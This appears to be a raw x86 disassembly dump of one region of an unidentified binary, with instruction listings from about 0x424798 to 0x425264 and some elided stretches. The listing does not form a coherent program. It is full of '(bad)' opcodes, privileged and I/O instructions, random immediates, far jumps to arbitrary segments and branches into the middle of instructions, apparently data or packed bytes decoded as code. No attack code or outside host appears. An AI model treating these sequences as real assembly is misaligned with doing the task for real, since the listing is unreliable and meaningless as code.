  424798:	retf   
  424799:	mov    ds:0x78eeed77,eax
  42479e:	hlt    
  42479f:	pop    ebx
  4247a0:	pop    esp
  4247a1:	mov    ss,WORD PTR [edx+eax*1-0x7d]
  4247a5:	xor    BYTE PTR [edi-0x3d1feb82],bl
  4247ab:	jecxz  0x4247f8
  4247ad:	or     cl,BYTE PTR [ebx-0x5abd6e6f]
  4247b3:	pop    edi
  4247b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	inc    ebx
  4247b6:	aas    
  4247b7:	mov    ecx,0x9a4f997a
  4247bc:	push   es
  4247bd:	popf   
  4247be:	lock (bad) 
  4247c0:	(bad)  [ebp+0x2613f13a]
  4247c6:	pop    ecx
  4247c7:	std    
  4247c8:	jmp    FWORD PTR [esi+0x14d317af]
  4247ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247cf:	(bad)  
  4247d0:	sub    BYTE PTR [edx],dh
  4247d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247d3:	sub    edx,esi
  4247d5:	sahf   
  4247d6:	pop    ss
  4247d7:	cmp    BYTE PTR [ecx-0xe70189c],bh
  4247dd:	mov    bh,0x27
  4247df:	xlat   BYTE PTR ds:[ebx]
  4247e0:	cmp    ebx,DWORD PTR [eax+edi*8]
  4247e3:	int3   
  4247e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247e5:	je     0x4247b8
  4247e7:	sub    BYTE PTR [ebp+0x2],ah
  4247ea:	and    BYTE PTR [ebx],0x33
  4247ed:	cmp    ah,dh
  4247ef:	daa    
  4247f0:	dec    esp
  4247f1:	adc    al,BYTE PTR [ecx]
  4247f3:	push   es
  4247f4:	icebp  
  4247f5:	lods   eax,DWORD PTR ds:[esi]
  4247f6:	(bad)  
  4247f7:	mov    ah,0xbb
  4247f9:	clc    
  4247fa:	ss stc 
  4247fc:	sbb    eax,0xe69fdd95
  424801:	dec    esp
  424802:	leave  
  424803:	pop    ecx
  424804:	arpl   WORD PTR [edx],si
  424806:	push   edi
  424807:	(bad)  
  424809:	add    eax,0xddab7bc7
  42480e:	inc    BYTE PTR [eax]
  424810:	cmp    BYTE PTR ss:[eax+0x70],dh
  424814:	imul   esp,DWORD PTR [ecx+ebp*2-0xcf5e7bd],0xfffffff0
  42481c:	sub    DWORD PTR [ebp-0x17abd38a],esp
  424822:	fmul   st(4),st
  424824:	in     al,dx
  424825:	and    eax,DWORD PTR [ebx+0x56afd487]
  42482b:	cmc    
  42482c:	sub    eax,0x8f688e5c
  424831:	push   edx
  424832:	xchg   edi,eax
  424833:	pusha  
  424834:	push   0x70
  424836:	repnz push ss
  424838:	bound  eax,QWORD PTR [edx]
  42483a:	mov    cs,WORD PTR [ecx+0x7c]
  42483d:	das    
  42483e:	sub    edx,ecx
  424840:	sti    
	...
  4248b1:	add    BYTE PTR [eax],al
  4248b3:	add    BYTE PTR [edx-0x770e5c],cl
  4248b9:	(bad)  
  4248bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248bc:	arpl   WORD PTR [ecx+0x31],dx
  4248bf:	je     0x424926
  4248c1:	mov    ecx,0x855f13b3
  4248c6:	add    DWORD PTR [eax],eax
  4248c8:	cmc    
  4248c9:	add    BYTE PTR [eax],al
  4248cb:	add    BYTE PTR [ebp+0x8],ah
  4248ce:	ins    DWORD PTR es:[edi],dx
  4248cf:	mov    dl,0xc5
  4248d1:	add    BYTE PTR [ebx],ch
  4248d3:	dec    edx
  4248d4:	mov    ds:0x953a9003,eax
  4248d9:	mov    DWORD PTR [edi],ebx
  4248db:	jmp    0x424863
  4248dd:	pop    ecx
  4248de:	xchg   ebx,eax
  4248df:	js     0x4248c3
  4248e1:	inc    ecx
  4248e2:	mul    DWORD PTR [ebp-0x708873fe]
  4248e8:	dec    esi
  4248e9:	sub    edi,DWORD PTR [eax-0x4158deb2]
  4248ef:	and    BYTE PTR [esi],0x28
  4248f2:	sub    dh,BYTE PTR [esi-0x6ef42073]
  4248f8:	and    ch,BYTE PTR [edx-0x16862eb0]
  4248fe:	(bad)  
  4248ff:	(bad)  
  424900:	in     eax,dx
  424901:	push   eax
  424902:	cmp    bl,BYTE PTR [ebp-0x12]
  424905:	mov    al,0xd2
  424907:	pop    ss
  424908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424909:	jp     0x424893
  42490b:	ret    0x754a
  42490e:	inc    edx
  42490f:	rcl    ebx,cl
  424911:	jbe    0x4248d1
  424913:	iret   
  424914:	xor    al,0xe8
  424916:	fsubr  QWORD PTR [edi-0x48]
  424919:	mov    bh,0x29
  42491b:	push   DWORD PTR [ebx+0x5ced043]
  424921:	jle    0x424909
  424923:	jle    0x424914
  424925:	mov    al,0x5d
  424927:	int3   
  424928:	sub    cl,BYTE PTR [eax*2-0x4f07366d]
  42492f:	pop    esi
  424930:	or     al,0x3c
  424932:	xchg   DWORD PTR [edx+ecx*1-0x6b],eax
  424936:	push   ebx
  424937:	inc    edi
  424938:	mov    ecx,0xee2f00ce
  42493d:	and    al,0x6b
  42493f:	ret    0x334
  424942:	in     al,0x5c
  424944:	mov    al,ds:0x54e7466a
  424949:	sbb    BYTE PTR [ecx-0x1991974f],bl
  42494f:	add    al,0x89
  424951:	cmp    eax,0x527080b7
  424956:	xor    DWORD PTR [edi],edi
  424958:	push   esi
  424959:	cmc    
  42495a:	cmc    
  42495b:	dec    esp
  42495c:	and    al,0x10
  42495e:	push   eax
  42495f:	jmp    0xd2bd3420
  424964:	push   ds
  424965:	xor    al,0x31
  424967:	iret   
  424968:	arpl   WORD PTR [esi+ebp*2],bx
  42496b:	xor    DWORD PTR [eax],ebp
  42496d:	retf   0x81a8
  424970:	jl     0x4248ff
  424972:	(bad)  
  424973:	cmp    BYTE PTR [edx+0x75b9d461],ah
  424979:	lods   al,BYTE PTR ds:[esi]
  42497a:	sub    al,0x8c
  42497c:	jne    0x424950
  42497e:	jae    0x42496c
  424980:	sti    
  424981:	leave  
  424982:	js     0x424915
  424984:	(bad)  
  424985:	push   ss
  424986:	(bad)  
  424988:	xor    al,0x0
  42498a:	and    BYTE PTR [edx-0x5b],al
  42498d:	and    DWORD PTR ds:0x288234e7,esi
  424993:	shl    dh,cl
  424995:	jmp    0x19e4:0x409b8b00
  42499c:	dec    esi
  42499d:	int    0x1e
  42499f:	repnz pop ss
  4249a1:	mov    ebp,0x4a0486ef
  4249a6:	mov    ch,0xce
  4249a8:	popa   
  4249a9:	add    eax,DWORD PTR [eax]
  4249ab:	loope  0x424a25
  4249ad:	adc    BYTE PTR [ebx-0x50],bl
  4249b0:	dec    ebp
  4249b1:	inc    BYTE PTR [ebp-0x7163c528]
  4249b7:	outs   dx,DWORD PTR ds:[esi]
  4249b8:	mov    cl,0x92
  4249ba:	in     al,dx
  4249bb:	clc    
  4249bc:	sbb    BYTE PTR [ebp+0x32],bh
  4249bf:	jo     0x4249c3
	...
  424a31:	add    BYTE PTR [eax],al
  424a33:	add    BYTE PTR [eax],dh
  424a35:	cmp    eax,0xdf7d9f75
  424a3a:	cli    
  424a3b:	mov    edi,0x13301881
  424a40:	push   DWORD PTR [ebp-0x79ab9f8d]
  424a46:	add    DWORD PTR [eax],eax
  424a48:	cmc    
  424a49:	add    BYTE PTR [eax],al
  424a4b:	add    al,ch
  424a4d:	loop   0x424a1a
  424a4f:	sahf   
  424a50:	aam    0xe9
  424a52:	imul   ecx,DWORD PTR [esi-0x16],0x1817b855
  424a59:	pusha  
  424a5a:	out    dx,eax
  424a5b:	sar    BYTE PTR [eax+esi*8],cl
  424a5e:	enter  0xbe49,0x98
  424a62:	add    ebx,DWORD PTR [edi+0x7b583bdf]
  424a68:	push   ss
  424a69:	mov    ds:0xd48a85b0,al
  424a6e:	pop    ebp
  424a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a70:	mov    cl,0xf2
  424a72:	xchg   esi,eax
  424a73:	mov    dl,0x48
  424a75:	mov    esi,0x86bbc231
  424a7a:	test   BYTE PTR [eax],0x8f
  424a7d:	ss mov ebp,0x2b5595aa
  424a83:	xlat   BYTE PTR ds:[ebx]
  424a84:	clc    
  424a85:	inc    edx
  424a86:	addr16 out dx,eax
  424a88:	(bad)  
  424a89:	fnstcw WORD PTR [esi-0x1a6383ee]
  424a8f:	mov    edx,0xd2a619dd
  424a94:	mov    edi,0xa2fcfb6
  424a99:	jecxz  0x424a7d
  424a9b:	sbb    ebp,DWORD PTR [edi+0x70]
  424a9e:	mov    BYTE PTR [esi],dh
  424aa0:	xlat   BYTE PTR ds:[ebx]
  424aa1:	push   cs
  424aa2:	nop
  424aa3:	sar    BYTE PTR [eax],cl
  424aa5:	data16 fisub DWORD PTR [esp+edx*2+0xae5f873]
  424aad:	pop    ebx
  424aae:	call   0xc0f5a147
  424ab3:	jns    0x424acc
  424ab5:	push   ecx
  424ab6:	mov    dh,0xdc
  424ab8:	jo     0x424add
  424aba:	cmp    cl,BYTE PTR [eax-0x3c]
  424abd:	stos   DWORD PTR es:[edi],eax
  424abe:	dec    ebp
  424abf:	lds    esi,FWORD PTR [eax+0xb]
  424ac2:	xchg   ebx,eax
  424ac3:	dec    edi
  424ac4:	adc    eax,0xc8d7af33
  424ac9:	aam    0xb1
  424acb:	dec    edx
  424acc:	pop    ebp
  424acd:	rcr    BYTE PTR [edi-0x6fd65aa7],1
  424ad3:	clc    
  424ad4:	dec    edx
  424ad5:	pop    es
  424ad6:	js     0x424abf
  424ad8:	fwait
  424ad9:	xchg   BYTE PTR [ebp-0x2bef688e],dh
  424adf:	add    BYTE PTR [edx-0x3f],al
  424ae2:	scas   al,BYTE PTR es:[edi]
  424ae3:	ss mov esi,0x723891f2
  424ae9:	jge    0x424ae2
  424aeb:	mov    edi,0x2bfcb680
  424af0:	and    ch,bh
  424af2:	mov    ebp,0xbdad08a2
  424af7:	mov    eax,ds:0x5af41ec2
  424afc:	mov    WORD PTR [eax-0x5a],es
  424aff:	xor    eax,0x9ce9a20e
  424b04:	enter  0x15d8,0x57
  424b08:	call   0x50cc:0x437c9e62
  424b0f:	cmp    ecx,edx
  424b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b12:	sub    eax,DWORD PTR [edi+0x22]
  424b15:	test   BYTE PTR [eax-0x4e],ch
  424b18:	pop    ecx
  424b19:	aas    
  424b1a:	push   edx
  424b1b:	xchg   ebx,eax
  424b1c:	push   esp
  424b1d:	mov    ds:0xdd95e1a5,al
  424b22:	and    bh,BYTE PTR [ebx+0x54]
  424b25:	cmp    DWORD PTR [edi+0x18],edi
  424b28:	jge    0x424acc
  424b2a:	pop    esp
  424b2b:	leave  
  424b2c:	dec    esp
  424b2d:	pop    ecx
  424b2e:	int    0xd8
  424b30:	push   cs
  424b31:	pop    eax
  424b32:	jbe    0x424bad
  424b34:	dec    edi
  424b35:	pop    esi
  424b36:	add    DWORD PTR [eax+edx*4+0x77],edi
  424b3a:	test   DWORD PTR [edx],0x8c4b8356
  424b40:	jge    0x424b42
	...
  424bb2:	add    BYTE PTR [eax],al
  424bb4:	std    
  424bb5:	(bad)  
  424bb6:	test   eax,0xff57ab46
  424bbb:	jmp    FWORD PTR [edx-0x6ab9f881]
  424bc1:	mov    ecx,0x8749a4d8
  424bc6:	add    DWORD PTR [eax],eax
  424bc8:	cmc    
  424bc9:	add    BYTE PTR [eax],al
  424bcb:	add    BYTE PTR [ebp+0x11],ah
  424bce:	push   esp
  424bcf:	rol    DWORD PTR [ebx-0x36],0xa7
  424bd3:	pop    esp
  424bd4:	pop    ds
  424bd5:	xlat   BYTE PTR ds:[ebx]
  424bd6:	imul   ebp,DWORD PTR [ecx+ebp*1],0xffffffd1
  424bda:	fnstcw WORD PTR [ecx+esi*2]
  424bdd:	addr16 ja 0x424c3e
  424be0:	(bad)  
  424be1:	cwde   
  424be2:	xchg   edx,eax
  424be3:	sar    BYTE PTR [edi-0x27],1
  424be6:	xchg   ebp,eax
  424be7:	pop    ds
  424be8:	xor    BYTE PTR [ebx-0x41],dh
  424beb:	push   esi
  424bec:	sbb    BYTE PTR [ebx-0x9],0xff
  424bf0:	loope  0x424c53
  424bf2:	push   0xfffffff0
  424bf4:	sbb    DWORD PTR [eax-0x527938e6],0xb9473307
  424bfe:	mov    ebp,0x187c5735
  424c03:	jmp    0xeaeb409d
  424c08:	fstp   DWORD PTR [edx-0x7c528a54]
  424c0e:	inc    ebx
  424c0f:	pop    ss
  424c10:	add    DWORD PTR [ecx*1-0x5608697c],edi
  424c17:	or     DWORD PTR [edi+0x4b],ecx
  424c1a:	das    
  424c1b:	push   ebp
  424c1c:	shr    DWORD PTR [esi],0xfc
  424c1f:	neg    DWORD PTR [esi-0x18]
  424c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c23:	dec    eax
  424c24:	or     eax,0x6fa57abb
  424c29:	mov    ah,0x62
  424c2b:	shl    BYTE PTR [edi],0x22
  424c2e:	imul   esi,DWORD PTR [edx+0x3842307],0xee3c7961
  424c38:	shl    BYTE PTR [edx],cl
  424c3a:	out    0x67,eax
  424c3c:	pop    es
  424c3d:	cld    
  424c3e:	cmp    cl,BYTE PTR [esp+ebp*8+0x1b]
  424c42:	mov    esi,0x8091f544
  424c47:	mov    eax,ds:0xb87fe095
  424c4c:	dec    edi
  424c4d:	in     al,dx
  424c4e:	mov    ebp,0xaad42b73
  424c53:	cli    
  424c54:	adc    dh,BYTE PTR ds:0x37645d0a
  424c5a:	mov    BYTE PTR [ecx],dl
  424c5c:	shr    ah,0x8b
  424c5f:	aas    
  424c60:	out    dx,al
  424c61:	jno    0x424cce
  424c63:	or     BYTE PTR [esi-0x73b20ab1],ch
  424c69:	pusha  
  424c6a:	jo     0x424c91
  424c6c:	push   ss
  424c6d:	jb     0x424c49
  424c6f:	fwait
  424c70:	mov    al,ds:0xaa4a012a
  424c75:	dec    ebx
  424c76:	or     al,0x2
  424c78:	fcom   QWORD PTR [edx]
  424c7a:	pop    ecx
  424c7b:	enter  0xb6c1,0x3d
  424c7f:	xchg   ecx,eax
  424c80:	cli    
  424c81:	out    dx,al
  424c82:	test   al,0x97
  424c84:	fs (bad) 
  424c86:	int    0x2c
  424c88:	push   eax
  424c89:	cmp    al,0x62
  424c8b:	inc    ebp
  424c8c:	adc    eax,0x4759b653
  424c91:	cmp    ah,BYTE PTR ss:[ebx+ecx*2]
  424c95:	cmp    al,dh
  424c97:	push   es
  424c98:	and    DWORD PTR [eax],ecx
  424c9a:	xor    eax,0x6d254968
  424c9f:	pop    ebp
  424ca0:	(bad)  
  424ca2:	pop    ebx
  424ca3:	pop    edi
  424ca5:	mov    dl,0xbc
  424ca7:	stos   DWORD PTR es:[edi],eax
  424ca8:	mov    DWORD PTR [ebp+0x73a45e3],ebx
  424cae:	cld    
  424caf:	adc    eax,0xe52be240
  424cb4:	mov    al,ds:0x50e6d4a6
  424cb9:	adc    ebx,DWORD PTR [ebx]
  424cbb:	sbb    BYTE PTR [esi],ch
  424cbd:	iret   
  424cbe:	jl     0x424d14
  424cc0:	push   ss
	...
  424d31:	add    BYTE PTR [eax],al
  424d33:	add    BYTE PTR [edx-0xa],ah
  424d36:	xchg   DWORD PTR [ecx],ecx
  424d38:	xchg   edi,eax
  424d39:	jns    0x424d29
  424d3b:	inc    DWORD PTR [ecx+ecx*4+0x2dbb94d7]
  424d42:	mov    al,0x46
  424d44:	mov    BYTE PTR ds:[ecx],al
  424d47:	add    ch,dh
  424d49:	add    BYTE PTR [eax],al
  424d4b:	add    BYTE PTR [edi],al
  424d4d:	or     BYTE PTR [edi+0x15],bl
  424d50:	call   0x2475:0x3158e221
  424d57:	adc    ch,BYTE PTR [eax-0x53ec325]
  424d5d:	pop    eax
  424d5e:	jmp    0xd99ab86e
  424d63:	push   esi
  424d64:	pop    ebx
  424d65:	push   ecx
  424d66:	call   0xba91556d
  424d6b:	mov    al,ds:0x9a553b5d
  424d70:	cmp    BYTE PTR [ecx+0x33],ch
  424d73:	pop    edx
  424d74:	or     BYTE PTR [eax-0x3552f557],dl
  424d7a:	mov    ebx,0x1fd5a97f
  424d7f:	imul   esp,DWORD PTR [edx-0xe3eafc9],0xb34da3e9
  424d89:	out    dx,eax
  424d8a:	in     eax,dx
  424d8b:	or     ch,BYTE PTR [edi]
  424d8d:	xor    DWORD PTR [edi-0x4b899ddf],edx
  424d93:	sub    eax,0x218464c8
  424d98:	retf   0xc8fd
  424d9b:	mov    gs,WORD PTR [edi-0x75]
  424d9e:	mov    WORD PTR [ebp+0x56],fs
  424da1:	push   ebp
  424da2:	inc    eax
  424da3:	cvtps2pi mm2,QWORD PTR [esi-0x5df9208b]
  424daa:	mov    dh,0x5d
  424dac:	aaa    
  424dad:	xor    al,0x18
  424daf:	jp     0x424e2b
  424db1:	and    BYTE PTR [ebp+0x5ae4218f],0x2
  424db8:	jmp    0x424dc3
  424dba:	jmp    0xe469:0xc301bae
  424dc1:	rcr    DWORD PTR ds:0x2430bfd5,0x26
  424dc8:	push   ds
  424dc9:	repnz (bad) 
  424dcb:	jno    0x424da0
  424dcd:	cmp    BYTE PTR [edx],cl
  424dcf:	pop    eax
  424dd0:	inc    ebx
  424dd1:	test   al,0x13
  424dd3:	out    dx,eax
  424dd4:	nop
  424dd5:	cmp    DWORD PTR [ecx-0x33],edi
  424dd8:	das    
  424dd9:	ja     0x424d6e
  424ddb:	sar    ecx,cl
  424ddd:	dec    edx
  424dde:	cmp    ch,BYTE PTR ds:0xf156dd24
  424de4:	adc    ch,BYTE PTR [eax]
  424de6:	jl     0x424e41
  424de8:	stos   DWORD PTR es:[edi],eax
  424de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424dea:	jl     0x424e66
  424dec:	ror    ecx,cl
  424dee:	and    DWORD PTR [eax-0x15900c1b],esi
  424df4:	or     al,0x1d
  424df6:	add    DWORD PTR [edx-0x1913ed1f],eax
  424dfc:	push   ebp
  424dfd:	or     eax,0x23dff676
  424e02:	(bad)  
  424e03:	xchg   ebx,eax
  424e04:	neg    ch
  424e06:	cmp    ch,dh
  424e08:	or     esp,DWORD PTR [eax+eax*1]
  424e0b:	js     0x424de7
  424e0d:	ffreep st(7)
  424e0f:	repz cwde 
  424e11:	sub    eax,0x473b6eaf
  424e16:	ins    DWORD PTR es:[edi],dx
  424e17:	adc    BYTE PTR [edx],ah
  424e19:	dec    ecx
  424e1a:	repnz sbb ah,dh
  424e1d:	arpl   si,sp
  424e1f:	dec    eax
  424e20:	dec    eax
  424e21:	pop    eax
  424e22:	sbb    al,0x31
  424e24:	fs push ebp
  424e26:	pop    eax
  424e27:	or     al,0xa4
  424e29:	in     al,0x87
  424e2b:	fist   WORD PTR [ecx+0x21]
  424e2e:	in     al,dx
  424e2f:	popf   
  424e30:	aaa    
  424e31:	and    al,BYTE PTR [ebx+eiz*1]
  424e34:	cmovl  edi,DWORD PTR [ebp+0x72]
  424e38:	inc    edx
  424e39:	mov    bl,0xb5
  424e3b:	inc    edi
  424e3c:	into   
  424e3d:	add    edx,DWORD PTR [edi]
  424e3f:	(bad)  
  424e40:	sub    al,0x0
	...
  424eb2:	add    BYTE PTR [eax],al
  424eb4:	scas   al,BYTE PTR es:[edi]
  424eb5:	call   0x9fff:0xff74b964
  424ebc:	xchg   edx,eax
  424ebd:	dec    ebp
  424ebe:	lea    edx,[edx-0x2d87266a]
  424ec4:	xor    ecx,DWORD PTR [ecx+0xf50001]
  424eca:	add    BYTE PTR [eax],al
  424ecc:	xchg   ebp,eax
  424ecd:	dec    ebp
  424ece:	fdiv   DWORD PTR [ecx+esi*8]
  424ed1:	mov    ah,0x99
  424ed3:	lock adc eax,DWORD PTR [edx+edi*1-0x5f1826ff]
  424edb:	mov    ss,edx
  424edd:	sbb    eax,0x2b9eb2c7
  424ee2:	int3   
  424ee3:	or     ch,al
  424ee5:	clc    
  424ee6:	or     eax,0xfe8935fa
  424eeb:	inc    ecx
  424eec:	or     DWORD PTR [edi+0x11],edi
  424eef:	push   DWORD PTR [esi+0x56bf6e86]
  424ef5:	jmp    0xa04fc8be
  424efa:	mov    dh,BYTE PTR [eax+0x45597232]
  424f00:	shl    DWORD PTR [edi+0x62ad7a5c],cl
  424f06:	lea    esp,[ebx+0x38]
  424f09:	jo     0x424f3f
  424f0b:	mov    cl,0xa6
  424f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f0e:	dec    ecx
  424f0f:	stc    
  424f10:	add    eax,0x726f7755
  424f15:	fidivr WORD PTR [esi-0x591c4420]
  424f1b:	mov    al,ds:0xfc9738f
  424f20:	and    eax,0x6b5ce7f1
  424f25:	inc    ebx
  424f26:	add    ebx,ebx
  424f28:	mov    al,0xda
  424f2a:	jg     0x424f5b
  424f2c:	repnz and edi,DWORD PTR [edi]
  424f2f:	nop
  424f30:	pop    ebx
  424f31:	push   ss
  424f32:	hlt    
  424f33:	(bad)  
  424f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f35:	lea    ecx,[ebx+0x0]
  424f38:	sub    DWORD PTR [ecx-0x5acbd698],edi
  424f3e:	xlat   BYTE PTR ds:[ebx]
  424f3f:	aad    0xc7
  424f41:	mov    al,0xd4
  424f43:	jo     0x424f71
  424f45:	loop   0x424efd
  424f47:	cmp    dl,0xe5
  424f4a:	arpl   dx,sp
  424f4c:	inc    esp
  424f4d:	ret    0xefc
  424f50:	and    DWORD PTR [esi],eax
  424f52:	mov    ebp,0xbea08aac
  424f57:	dec    edx
  424f58:	rcl    esp,1
  424f5a:	adc    eax,0x28f89a64
  424f5f:	mov    BYTE PTR [ebp-0x3e],cl
  424f62:	shr    DWORD PTR ds:0x62a2a529,cl
  424f68:	xchg   edx,eax
  424f69:	cmc    
  424f6a:	lods   eax,DWORD PTR ds:[esi]
  424f6b:	and    cl,ch
  424f6d:	cmp    eax,0xe54ccc81
  424f72:	daa    
  424f73:	push   esi
  424f74:	lahf   
  424f75:	add    esi,DWORD PTR [ecx+0x4b193502]
  424f7b:	adc    BYTE PTR [edi-0x67a08da2],0xaa
  424f82:	adc    ecx,DWORD PTR [ebx-0x4a5b7ba8]
  424f88:	mov    al,0x1
  424f8a:	rol    eax,cl
  424f8c:	jge    0x424f75
  424f8e:	jle    0x424fc1
  424f90:	das    
  424f91:	arpl   WORD PTR [edx-0x14],di
  424f94:	loopne 0x424f20
  424f96:	sar    BYTE PTR [eax+0x7e],0x9f
  424f9a:	xchg   edi,eax
  424f9b:	es push esp
  424f9d:	push   esp
  424f9e:	mov    esi,DWORD PTR [ecx+0x860817c]
  424fa4:	and    al,ch
  424fa6:	jmp    0x424fea
  424fa8:	jp     0x424f3c
  424faa:	pop    edx
  424fab:	mov    DWORD PTR [ebx+0x17619007],ebp
  424fb1:	cmp    bh,BYTE PTR [ebp+0x3b]
  424fb4:	js     0x424f5b
  424fb6:	xchg   esi,ebx
  424fb8:	mov    ds:0x88c90b0e,eax
  424fbd:	or     DWORD PTR ds:0x89bc,ecx
	...
  425033:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  425037:	mov    cl,0x2e
  425039:	idiv   edi
  42503b:	fst    st(3)
  42503d:	inc    eax
  42503e:	sahf   
  42503f:	pop    ds
  425040:	mov    cl,0xe5
  425042:	push   esp
  425043:	push   ebp
  425044:	sub    BYTE PTR [edx+0xf50001],cl
  42504a:	add    BYTE PTR [eax],al
  42504c:	not    ch
  42504e:	cmp    eax,0x612c43bf
  425053:	sub    eax,0x20d03b9c
  425058:	call   DWORD PTR [edi-0x699635e7]
  42505e:	cmp    ebx,DWORD PTR [eax-0x6d]
  425061:	out    0xe2,al
  425063:	sbb    DWORD PTR [ecx],esp
  425065:	pop    ebp
  425066:	adc    BYTE PTR [esi+edx*4-0x7ab1ae1d],bh
  42506d:	mov    cl,0xdf
  42506f:	add    al,0xa4
  425071:	inc    esp
  425072:	stos   BYTE PTR es:[edi],al
  425073:	jno    0x4250a3
  425075:	add    ecx,DWORD PTR [ebx-0x1046d355]
  42507b:	mov    eax,ds:0xf650d5c2
  425080:	ins    DWORD PTR es:[edi],dx
  425081:	xchg   edi,eax
  425082:	and    eax,0x87c4c9e1
  425087:	push   ss
  425088:	pop    edi
  425089:	fwait
  42508a:	in     al,0x62
  42508c:	(bad)  
  42508d:	jb     0x425047
  42508f:	wbinvd 
  425091:	push   ss
  425092:	xchg   esp,eax
  425093:	push   eax
  425094:	add    ch,0x3f
  425097:	push   ss
  425098:	loope  0x42505c
  42509a:	gs aad 0x84
  42509d:	push   ds
  42509e:	xchg   BYTE PTR [eax+0x2fdcd227],bh
  4250a4:	dec    eax
  4250a5:	dec    esi
  4250a6:	mov    eax,ds:0x644fd7cf
  4250ab:	push   edx
  4250ac:	mov    cl,0x89
  4250ae:	add    eax,0x3b30b9e0
  4250b3:	jb     0x425046
  4250b5:	mov    WORD PTR [eax+ebx*4+0x572556bd],gs
  4250bc:	mov    ecx,0x8736dacf
  4250c1:	and    dh,BYTE PTR [ebx+0x3e]
  4250c4:	push   ebp
  4250c5:	add    BYTE PTR [edx+0x0],bh
  4250c8:	inc    eax
  4250c9:	sbb    BYTE PTR [ebx],dl
  4250cb:	xchg   esi,eax
  4250cc:	out    dx,al
  4250cd:	pop    edx
  4250ce:	and    al,0x3c
  4250d0:	js     0x425123
  4250d2:	lods   al,BYTE PTR ds:[esi]
  4250d3:	mov    ecx,0x6e28a92c
  4250d8:	rcl    DWORD PTR [edi-0xd],cl
  4250db:	ss xor eax,0x906a79ae
  4250e1:	xor    BYTE PTR [edi+0x47],bl
  4250e4:	inc    esp
  4250e5:	mov    eax,ds:0xb22aa66a
  4250ea:	mov    ch,BYTE PTR [esi-0x31]
  4250ed:	xchg   esp,ebx
  4250ef:	sbb    ebp,DWORD PTR [esi]
  4250f1:	or     al,0x46
  4250f3:	leave  
  4250f4:	dec    ecx
  4250f5:	(bad)  
  4250f6:	retf   
  4250f7:	pop    eax
  4250f8:	enter  0x41a0,0x6e
  4250fc:	xor    al,0x47
  4250fe:	adc    cl,ch
  425100:	pop    ecx
  425101:	cld    
  425102:	adc    BYTE PTR [esi+eiz*8],al
  425105:	and    DWORD PTR [eax],esp
  425107:	pop    ebp
  425108:	and    DWORD PTR [ecx+eiz*4+0x6c],eax
  42510c:	test   edi,esp
  42510e:	jno    0x425131
  425110:	icebp  
  425111:	add    DWORD PTR ds:0x363a65e6,esp
  425117:	dec    esi
  425118:	pop    ebx
  425119:	jb     0x425196
  42511b:	stc    
  42511c:	mov    ebp,0x2425ace2
  425121:	(bad)  
  425122:	jae    0x4250e5
  425124:	mov    ch,BYTE PTR [ecx+0x7c]
  425127:	ret    0xa213
  42512a:	fistp  DWORD PTR [eax+0x45bfec03]
  425130:	pop    ds
  425131:	daa    
  425132:	adc    al,0x9b
  425134:	ins    BYTE PTR es:[edi],dx
  425135:	or     al,BYTE PTR [esp+ebx*1+0x13]
  425139:	call   0xbe681417
  42513e:	(bad)  
  42513f:	adc    eax,0x90
	...
  4251b4:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	mov    edi,0x1dc1b326
  4251c5:	mov    eax,DWORD PTR [ecx]
  4251c7:	add    ch,dh
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [ebx-0x2d],bl
  4251ce:	pop    eax
  4251cf:	(bad)  
  4251d0:	push   edx
  4251d1:	inc    ebp
  4251d2:	fmul   st(1),st
  4251d4:	cmp    ebx,ecx
  4251d6:	adc    dl,ah
  4251d8:	adc    esi,DWORD PTR [ecx+0x15]
  4251db:	jmp    0x42517c
  4251dd:	adc    BYTE PTR [eax-0x77044c91],dh
  4251e3:	sbb    BYTE PTR [edi],bl
  4251e5:	test   eax,0xfd7bbb6a
  4251ea:	scas   al,BYTE PTR es:[edi]
  4251eb:	pop    ebx
  4251ec:	dec    esp
  4251ed:	push   ecx
  4251ee:	icebp  
  4251ef:	jo     0x425247
  4251f1:	test   al,0xc4
  4251f3:	mov    ah,0xcc
  4251f5:	repnz imul DWORD PTR [ecx]
  4251f8:	call   0xcefb98a1
  4251fd:	js     0x425248
  4251ff:	out    0xce,al
  425201:	scas   al,BYTE PTR es:[edi]
  425202:	push   ebx
  425203:	pop    ecx
  425204:	inc    ebx
  425205:	add    ebp,0x6dfd7665
  42520b:	mov    bl,0xbd
  42520d:	loope  0x425196
  42520f:	pop    esi
  425210:	lock rcl DWORD PTR [eax],cl
  425213:	mov    bl,0x17
  425215:	mul    DWORD PTR [ebx-0x4c]
  425218:	push   edx
  425219:	fsubr  DWORD PTR [eax-0x222a82fe]
  42521f:	mov    al,BYTE PTR [eax+0x5c3b2a39]
  425225:	add    bh,bl
  425227:	jo     0x425254
  425229:	add    DWORD PTR [edx],edx
  42522b:	cmp    eax,0xf705ed19
  425230:	xchg   ebp,eax
  425231:	cdq    
  425232:	xor    eax,0xc7cd0bd9
  425237:	cmp    eax,DWORD PTR [edi+0x7c31a54c]
  42523d:	push   edi
  42523e:	push   esi
  42523f:	pushf  
  425240:	pop    edx
  425241:	jb     0x4251e0
  425243:	test   al,0x77
  425245:	jae    0x425202
  425247:	inc    ecx
  425248:	or     al,0x90
  42524a:	mov    dl,0x71
  42524c:	pop    es
  42524d:	(bad)
  425250:	xchg   edx,eax
  425251:	fldenv [ecx]
  425253:	enter  0x4888,0x1c
  425257:	fdivr  st(3),st
  425259:	inc    edx
  42525a:	and    DWORD PTR [ebx-0x37],eax
  42525d:	ins    DWORD PTR es:[edi],dx
  42525e:	pop    es
  42525f:	pushf  
  425260:	jmp    esi
  425262:	jmp    0x42523f
  425264:	ds out dx,eax
